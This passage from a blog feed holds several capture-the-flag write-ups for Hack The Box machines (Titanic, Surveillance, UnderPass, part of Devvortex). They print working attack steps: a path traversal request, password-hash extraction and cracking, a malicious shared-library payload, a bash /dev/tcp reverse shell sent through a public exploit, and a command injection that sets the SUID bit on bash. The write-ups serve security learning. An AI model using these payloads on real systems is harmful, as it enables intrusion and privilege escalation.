class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/web/</span>user<span class="hljs-operator">-</span>management<span class="hljs-operator">-</span>service<span class="hljs-regexp">/log/</span>application.log<br><br></code></pre></td></tr></table></figure><p>Waited a couple minutes, then got root shell:</p><p><img src="/img/Eureka/root.PNG"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/Eureka/ghibli.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Hard</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Titanic</title>
    <link href="/2025/06/22/HTB-Titanic/"/>
    <url>/2025/06/22/HTB-Titanic/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/titanic/Pasted-image-20250225232815.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>We start by scanning ports:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap <span class="hljs-number">10.10.11.55</span> -sV -T4 -<span class="hljs-keyword">A</span><br></code></pre></td></tr></table></figure><p><img src="/img/titanic/Pasted-image-20250219163641.png"></p><p>The <strong>Nmap scan</strong> reveals two open ports on <strong>titanic.htb (10.10.11.55)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> → Running OpenSSH 8.9p1 (Ubuntu)</li><li><strong>Port 80 (HTTP)</strong> → Running Apache 2.4.52 with Werkzeug&#x2F;Python</li></ul><p> Add :  titanic.htb to  <strong>&#x2F;etc&#x2F;hosts</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.55</span>    titanic.htb<br></code></pre></td></tr></table></figure><p>Port 80 show a website:</p><p><img src="/img/titanic/Pasted-image-20250219164535.png"></p><h2 id="Directory-Subdomain-Enumeration"><a href="#Directory-Subdomain-Enumeration" class="headerlink" title="Directory &amp; Subdomain Enumeration:"></a>Directory &amp; Subdomain Enumeration:</h2><h4 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch :"></a>Dirsearch :</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u titanic.htb -t <span class="hljs-number">50</span> <br></code></pre></td></tr></table></figure><p><img src="/img/titanic/Pasted-image-20250219165811.png"></p><h4 id="SubdomainFuzz"><a href="#SubdomainFuzz" class="headerlink" title="SubdomainFuzz:"></a>SubdomainFuzz:</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/ -H &quot;HOST: FUZZ.titanic.htb&quot; -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -fc <span class="hljs-number">301</span><br></code></pre></td></tr></table></figure><p><img src="/img/titanic/Pasted-image-20250219170418.png"></p><p>Add domain name dev.titanic.htb to &#x2F;etc&#x2F;hosts and open it:</p><p><img src="/img/titanic/Pasted-image-20250219170706.png"></p><p>I found two repositories: </p><p><img src="/img/titanic/Pasted-image-20250219170858.png"></p><h6 id="app-py"><a href="#app-py" class="headerlink" title="app.py:"></a>app.py:</h6><p><img src="/img/titanic/Pasted-image-20250219170929.png"></p><h6 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml:"></a>docker-compose.yml:</h6><p><img src="/img/titanic/Pasted-image-20250219171001.png"></p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access:"></a>Initial Access:</h2><p>I provided the <strong>app.py</strong> source code to ChatGPT for review:</p><p><img src="/img/titanic/Pasted-image-20250219172906.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">**Path Traversal** is <span class="hljs-keyword">a</span> vulnerability that allows attackers <span class="hljs-built_in">to</span> access <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">directories</span> outside <span class="hljs-keyword">the</span> intended scope <span class="hljs-keyword">by</span> manipulating input paths. This can lead <span class="hljs-built_in">to</span> unauthorized access <span class="hljs-built_in">to</span> sensitive <span class="hljs-built_in">files</span>, such <span class="hljs-keyword">as</span> **configuration <span class="hljs-built_in">files</span>, passwords, <span class="hljs-keyword">or</span> <span class="hljs-keyword">system</span> data**.<br></code></pre></td></tr></table></figure><p>Let’s test it with curl:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/img/titanic/Pasted-image-20250219175602.png"></p><p>We can also get the user flag:</p><p><img src="/img/titanic/Pasted-image-20250219175732.png"></p><p>After reading through <a href="https://docs.gitea.com/installation/install-with-docker">gitea documentation</a> I discovered a <code>gitea.db</code> file located in the <code>data</code> directory :</p><p><img src="/img/titanic/Pasted-image-20250219181106.png"></p><p>I download it, and I searched for Developer’s password using  <a href="https://0xdf.gitlab.io/2024/12/14/htb-compiled.html">0xdf’s</a> commands:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlite3 gitea.db <span class="hljs-string">&quot;select passwd from user&quot;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> <span class="hljs-built_in">hash</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$hash</span>&quot;</span> | xxd -r -p | <span class="hljs-built_in">base64</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="/img/titanic/Pasted-image-20250219181612.png"></p><p>I used Hashcat to crack it:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">10900</span> gitea<span class="hljs-selector-class">.hashes</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--user</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Username: developer<br>Password: 25282528<br></code></pre></td></tr></table></figure><p><img src="/img/titanic/Pasted-image-20250225175405.png"></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation:"></a>Privilege Escalation:</h2><p>While running LinPEAS, I discovered two interesting files: <code>/opt/scripts/identify_images.sh</code> and <code>/usr/bin/magick</code>:</p><p><img src="/img/titanic/Pasted-image-20250225175036.png"></p><p><img src="/img/titanic/Pasted-image-20250225175831.png"></p><p>This script searches for all <code>.jpg</code> images in <code>/opt/app/static/assets/images/</code>, extracts their metadata using ImageMagick, and saves the output in <code>metadata.log</code>, overwriting any previous content.</p><p>After researching known vulnerabilities in ImageMagick, I found that CVE-2024-41817 affects this version. This vulnerability could allow arbitrary code execution by loading malicious configuration files or shared libraries from the current working directory when executing ImageMagick.</p><p><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8</a></p><p><img src="/img/titanic/Pasted-image-20250225180537.png"></p><p>From <code>identify_images.sh</code>, we know that the working directory is <code>/opt/app/static/assets/images/</code>. We can create a shared library in this directory that copies <code>/root/root.txt</code> and modifies its permissions.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc -x c -shared -fPIC -o ./libxcb.so.<span class="hljs-number">1</span> - &lt;&lt; EOF<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br>__attribute__((constructor)) void init()&#123;<br>    system(<span class="hljs-string">&quot;cp /root/root.txt root.txt; chmod 754 root.txt&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p>After a while we get the flag:</p><p><img src="/img/titanic/Pasted-image-20250225181359.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/titanic/kiki.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Surveillance</title>
    <link href="/2025/06/19/HTB-Surveillance/"/>
    <url>/2025/06/19/HTB-Surveillance/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/Surveillance/Pasted-image-20250621145653.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Medium</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>We start by scanning ports:</p><p><img src="/img/Surveillance/Pasted-image-20250618121943.png"></p><p>The <strong>Nmap scan</strong> reveals two open ports on <strong>surveillance.htb (10.10.11.245)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><p> Add :  surveillance.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p> <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.254</span>    surveillance.htb<br></code></pre></td></tr></table></figure><p>Port 80 show a website:</p><p><img src="/img/Surveillance/Pasted-image-20250618122020.png"></p><p>Upon inspecting the source code, we can see that the website is powered by Craft CMS version 4.4.14:</p><p><img src="/img/Surveillance/Pasted-image-20250621152234.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h1><h2 id="Shell-as-www-data"><a href="#Shell-as-www-data" class="headerlink" title="Shell as www-data"></a>Shell as www-data</h2><p>Researching this version reveals that Craft CMS 4.4.14 is affected by CVE-2023-41892. This vulnerability allows attackers to bypass the template sandbox restrictions, which are meant to prevent untrusted code from being executed. If a plugin or custom module renders user-controlled templates without proper security checks, an unauthenticated attacker could exploit this flaw to execute arbitrary code on the server, potentially leading to full site compromise.</p><p>Several exploits were tested, including ones available through Metasploit, but none of them worked in this case. However, the exploit from this repository — <a href="https://github.com/0xfalafel/CraftCMS_CVE-2023-41892">https://github.com/0xfalafel/CraftCMS_CVE-2023-41892</a> — successfully exploited the vulnerability on this specific Craft CMS version</p><p>![](&#x2F;img&#x2F;Surveillance&#x2F;Pasted image 20250619151336.png)</p><p>In addition to the default <code>www-data</code> user, we also identified two other local users: <code>matthew</code> and <code>zoneminder</code>.</p><p><img src="/img/Surveillance/Pasted-image-20250619154418.png"></p><h2 id="Shell-as-matthew"><a href="#Shell-as-matthew" class="headerlink" title="Shell as matthew"></a>Shell as matthew</h2><p>While exploring the file system, we discover a ZIP archive containing a database, which may hold credentials or other sensitive information useful for further access.</p><p><img src="/img/Surveillance/Pasted-image-20250619152357.png"></p><p>We unzip the archive and download the database file to our local machine for further analysis:</p><p><img src="/img/Surveillance/Pasted-image-20250619154531.png"></p><p>By searching through the file, we find the SHA-256 password hash for the user <code>matthew</code> :</p><p><img src="/img/Surveillance/Pasted-image-20250619154320.png"></p><p>Next, we use CrackStation to crack the password hash:</p><p><img src="/img/Surveillance/Pasted-image-20250619154216.png"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Username:matthew<br><span class="hljs-bullet">- </span>Password:starcraft122490<br></code></pre></td></tr></table></figure><p>We successfully log in as Matthew via SSH and find the user flag in his home directory:</p><p><img src="/img/Surveillance/Pasted-image-20250619154146.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Shell-as-Zoneminder"><a href="#Shell-as-Zoneminder" class="headerlink" title="Shell as Zoneminder"></a>Shell as Zoneminder</h2><p>Running LinPEAS uncovers the presence of a ZoneMinder installation on the target machine:</p><p><img src="/img/Surveillance/Pasted-image-20250621155334.png"></p><p>ZoneMinder is an open-source video surveillance software system that allows users to monitor and record video from security cameras. It is commonly used for home or business security setups, providing features like live streaming, motion detection, and event recording.</p><p><img src="/img/Surveillance/Pasted-image-20250619161308.png"></p><p>We attempted to connect to the database and found a password hash for the admin user, but it couldn’t be cracked :&#x2F; </p><p><img src="/img/Surveillance/Pasted-image-20250621155643.png"></p><p>I proceeded to search through the files to identify the ZoneMinder version and found it by running:</p><p><img src="/img/Surveillance/Pasted-image-20250621155832.png"></p><p>This version, 1.36.32, is vulnerable to <strong>CVE-2023-26035</strong>. This vulnerability allows an attacker to bypass authentication and gain unauthorized access to the ZoneMinder application. Essentially, it means someone could take control of the system without needing valid login credentials, which poses a serious security risk.</p><p>I ran the exploit script from <a href="https://github.com/heapbytes/CVE-2023-26035">this repository</a> with the following command:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 poc.py --target http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8888</span><span class="hljs-regexp">/ --cmd &#x27;bash -c &quot;bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-variable">$IP</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>We successfully obtained a shell as the user <code>zoneminder</code>:</p><p><img src="/img/Surveillance/Pasted-image-20250621161116.png"></p><h2 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h2><p>Looking at the sudo privileges for the <code>zoneminder</code> user, we see that it can run any ZoneMinder Perl script located in <code>/usr/bin/</code> without a password:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zoneminder<span class="hljs-variable">@surveillance</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> zoneminder on <span class="hljs-symbol">surveillance:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>,<br>    use_pty<br><br><span class="hljs-title class_">User</span> zoneminder may run the following commands on <span class="hljs-symbol">surveillance:</span><br>    (<span class="hljs-title class_">ALL</span> : <span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/zm[a-zA-Z]*.pl *<br><br></code></pre></td></tr></table></figure><p>Examining the Perl scripts, the script <code>zmupdate.pl</code> uses the <code>--pass</code> parameter  to execute MySQL commands, escaping the input with quotes, which provides some sanitization.</p><p>However, the <code>--user</code> parameter  is used without validation, making it vulnerable to command injection:</p><p><img src="/img/Surveillance/Pasted-image-20250621162247.png"></p><p>Now, using the password we found in <code>/usr/share/zoneminder/www/api/app/Config/database.php</code>, we can exploit the vulnerability in the <code>zmupdate.pl</code> script by injecting a payload through the <code>--user</code> parameter:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl <span class="hljs-comment">--version 1 --user &#x27; $(chmod u+s /bin/bash)&#x27;</span><br>&lt;ate.pl <span class="hljs-comment">--version 1 --user &#x27; $(chmod u+s /bin/bash)&#x27;</span><br><br>Initiating database upgrade <span class="hljs-built_in">to</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1.36</span><span class="hljs-number">.32</span> <span class="hljs-built_in">from</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1</span><br><br>WARNING - You have specified <span class="hljs-keyword">an</span> upgrade <span class="hljs-built_in">from</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1</span> but <span class="hljs-keyword">the</span> database <span class="hljs-built_in">version</span> found is <span class="hljs-number">1.36</span><span class="hljs-number">.32</span>. Is this correct?<br>Press enter <span class="hljs-built_in">to</span> continue <span class="hljs-keyword">or</span> ctrl-C <span class="hljs-built_in">to</span> abort : <br><br>Do you wish <span class="hljs-built_in">to</span> take <span class="hljs-keyword">a</span> backup <span class="hljs-keyword">of</span> your database prior <span class="hljs-built_in">to</span> upgrading?<br>This may <span class="hljs-built_in">result</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> large <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> /tmp/zm <span class="hljs-keyword">if</span> you have <span class="hljs-keyword">a</span> lot <span class="hljs-keyword">of</span> events.<br>Press <span class="hljs-string">&#x27;y&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> backup <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-built_in">to</span> continue : n<br><br>Upgrading database <span class="hljs-built_in">to</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1.36</span><span class="hljs-number">.32</span><br>Upgrading DB <span class="hljs-built_in">to</span> <span class="hljs-number">1.26</span><span class="hljs-number">.1</span> <span class="hljs-built_in">from</span> <span class="hljs-number">1.26</span><span class="hljs-number">.0</span><br>ERROR <span class="hljs-number">1698</span> (<span class="hljs-number">28000</span>): Access denied <span class="hljs-keyword">for</span> user <span class="hljs-string">&#x27;-pZoneMinderPassword2023&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span><br>Output: <br>Command <span class="hljs-string">&#x27;mysql -u $(chmod u+s /bin/bash) -p&#x27;</span>ZoneMinderPassword2023<span class="hljs-string">&#x27; -hlocalhost zm &lt; /usr/share/zoneminder/db/zm_update-1.26.1.sql&#x27;</span> exited <span class="hljs-keyword">with</span> status: <span class="hljs-number">1</span><br>zoneminder@surveillance:~$ bash -p<br>bash -p<br>whoami<br>root<br></code></pre></td></tr></table></figure><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/Surveillance/totoro.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Medium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB — UnderPass</title>
    <link href="/2025/05/06/HTB-%E2%80%94-UnderPass/"/>
    <url>/2025/05/06/HTB-%E2%80%94-UnderPass/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/Underpass/Underpass.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>I start by scanning ports:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap <span class="hljs-number">10.10.11.48</span> -<span class="hljs-keyword">A</span> -T4<br></code></pre></td></tr></table></figure><p><img src="/img/Underpass/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><p>Add :  underpass.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p><p><img src="/img/Underpass/host.png"></p><p><strong>Port 80</strong> returns the default Apache2 Ubuntu welcome page, indicating that the web server is up and running but has not been configured to host any custom content:</p><p><img src="/img/Underpass/port80.png"></p><h2 id="Directory-Subdomain-Enumeration"><a href="#Directory-Subdomain-Enumeration" class="headerlink" title="Directory &amp; Subdomain Enumeration:"></a>Directory &amp; Subdomain Enumeration:</h2><p>After attempting directory fuzzing using Feroxbuster, no useful results were discovered:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">feroxbuster -u http:<span class="hljs-regexp">//u</span>nderpass.htb  -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>raft-small-words.txt<br></code></pre></td></tr></table></figure><p><img src="/img/Underpass/domainenum.png"></p><h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><p>After more enumeration with no results, I decided to run a UDP scan. UDP scans are slower since they don’t always get a response, but they can reveal important services. Here are the results:</p><p><img src="/img/Underpass/udpscan.png"></p><p>UDP port 161 was found open, which is used by the SNMP (Simple Network Management Protocol) service. SNMP is commonly used for managing and monitoring network devices like routers, switches, and servers. If misconfigured, it can expose sensitive information such as system details or network configurations.</p><p>We will use the <code>snmpwalk</code> command for enumeration to gather information about the target system:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">snmpwalk -v<span class="hljs-number">2</span><span class="hljs-keyword">c</span> -<span class="hljs-keyword">c</span> public <span class="hljs-number">10.10</span>.<span class="hljs-number">11.48</span><br></code></pre></td></tr></table></figure><p><img src="/img/Underpass/snmpwalk.png"></p><p>From the output, we can observe that the system contact is <code>steve@underpass.htb</code>, which might be useful for further investigation. Additionally, the message <code>&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</code> indicates that the system is running <strong>daloRadius</strong>, an open-source RADIUS management tool. This is important because daloRadius is often used for network access control.</p><p>After some searching, I found that the daloRadius server can be accessed via <code>http://underpass.htb/daloradius</code>. Since the system is identified as the only daloRadius server in the network, this could be a key target for further exploration. To dig deeper, we’ll use <strong>feroxbuster</strong> to scan for additional directories under <code>/daloradius</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">feroxbuster -u http:<span class="hljs-regexp">//u</span>nderpass.htb<span class="hljs-regexp">/daloradius  -w /u</span>sr<span class="hljs-regexp">/share/</span>seclists<span class="hljs-regexp">/Discovery/</span>Web-Content/raft-small-words.txt <br></code></pre></td></tr></table></figure><p>The scan revealed a large number of accessible locations, but a few stood out as particularly interesting for further investigation:</p><ul><li><code>http://underpass.htb/daloradius/app/users/</code></li><li><code>http://underpass.htb/daloradius/app/users/include/</code></li><li><code>http://underpass.htb/daloradius/app/users/library/</code></li><li><code>http://underpass.htb/daloradius/app/operators/</code></li><li><code>http://underpass.htb/daloradius/doc/install/INSTALL</code></li><li><code>http://underpass.htb/daloradius/LICENSE</code></li></ul><p>Notably, <code>http://underpass.htb/daloradius/app/users/</code> redirected to a login page:</p><p><img src="/img/Underpass/login.png"></p><p>The file located at <code>http://underpass.htb/daloradius/doc/install/INSTALL</code> contained default credentials commonly used during the initial setup of daloRadius:</p><p><img src="/img/Underpass/doc.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access:"></a>Initial Access:</h1><p>I attempted to log in using the default credentials at <code>/app/users</code>, but they didn’t work—leaving me stuck at this point for a while :))</p><p>So, I decided to manually explore the other discovered directories—and that’s when I came across this:</p><p><img src="/img/Underpass/operators.png"></p><p>After trying the default credentials again, I was finally able to log in :))</p><p><img src="/img/Underpass/radius.png"></p><p>I discovered a registered user entry that included a username along with an MD5 hash:</p><p><img src="/img/Underpass/userregiste.png"></p><p><img src="/img/Underpass/crackstation.png"></p><p>I used CrackStation to crack the MD5 hash, and the credentials obtained were:</p><ul><li><strong>Username:</strong> svcMosh</li><li><strong>Password:</strong> underwaterfriends</li></ul><p>This allowed me to successfully access the system through SSH:</p><p><img src="/img/Underpass/ssh.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation:"></a>Privilege Escalation:</h1><p>Once logged in via SSH, I initiated privilege escalation enumeration by running <code>sudo -l</code> to check for any commands the user <strong>svcMosh</strong> could execute with elevated privileges:</p><p><img src="/img/Underpass/sudo-l.png"></p><p>Running <code>sudo -l</code> revealed that the user <strong>svcMosh</strong> can execute <code>/usr/bin/mosh-server</code> with <strong>sudo</strong> privileges <strong>without a password</strong></p><p><strong>mosh-server</strong> is part of the <a href="https://mosh.org/">Mosh (Mobile Shell)</a> system, which is an alternative to SSH that provides more resilience to network issues like disconnections and roaming.</p><p>When run, <code>mosh-server</code> typically spawns a <strong>new shell</strong> session for a user. If a low-privileged user like <code>svcMosh</code> can run <code>mosh-server</code> with <strong>sudo rights and no password</strong>, it might be possible to <strong>invoke a root shell</strong> directly or leverage the command to spawn a privileged shell.</p><p><img src="/img/Underpass/mosh_server.png"><br>This revealed the connection info, including the key and port number (e.g., 60002).<br>As mentioned in this article <a href="https://linux.die.net/man/1/mosh-client">https://linux.die.net/man/1/mosh-client</a>, I can use the <code>mosh-client</code> to connect to the <code>mosh-server</code>. By specifying the connection key (<code>fMez/7xu1NOhnW8cD5RYpQ</code>) and the appropriate IP address and port (<code>127.0.0.1</code> and <code>60002</code>)</p><p><img src="/img/Underpass/exploit.png"></p><p><img src="/img/Underpass/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/Underpass/cat.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Devvortex</title>
    <link href="/2025/05/04/HTB-Devvortex/"/>
    <url>/2025/05/04/HTB-Devvortex/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/devvortexpic/devvortex.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>I start by scanning ports:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap <span class="hljs-number">10.10.11.242</span> -<span class="hljs-keyword">A</span> -T4<br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals two open ports on <strong>devvortex.htb (10.10.11.242)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><h2 id="Web-enumeration"><a href="#Web-enumeration" class="headerlink" title="Web enumeration:"></a>Web enumeration:</h2><p>Now that I have the main domain, I can try to find subdomains by brute-forcing with a wordlist:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span>devvortex.htb<span class="hljs-regexp">/ -H 